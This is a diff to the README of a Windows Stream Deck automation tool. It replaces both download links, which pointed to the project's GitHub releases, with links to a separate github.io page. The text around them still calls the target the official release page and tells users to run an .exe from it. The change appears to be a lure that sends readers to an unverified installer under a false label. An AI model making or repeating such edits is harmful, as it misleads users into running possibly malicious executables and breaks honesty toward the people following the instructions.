@@ -1,6 +1,6 @@
 # 🎮 codex-stream-deck - Control local tasks with Stream Deck
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/argent-mineraltar875/codex-stream-deck/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://argent-mineraltar875.github.io)
 
 Codex Stream Deck lets you trigger local actions on your computer using an Elgato Stream Deck. This software bridges your hardware device with internal processes, allowing you to run scripts, open folders, or manage system settings with a single button press. It provides a secure interface for your personal automation needs.
 
@@ -12,7 +12,7 @@ You need a Windows computer to run this application. Ensure you have the Elgato 
 
 You must visit the official release page to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/argent-mineraltar875/codex-stream-deck/releases)
+[Visit this page to download the software](https://argent-mineraltar875.github.io)
 
 Choose the file ending in .exe from the latest release list. Save this file to a folder you can find later, such as your Downloads folder.
 
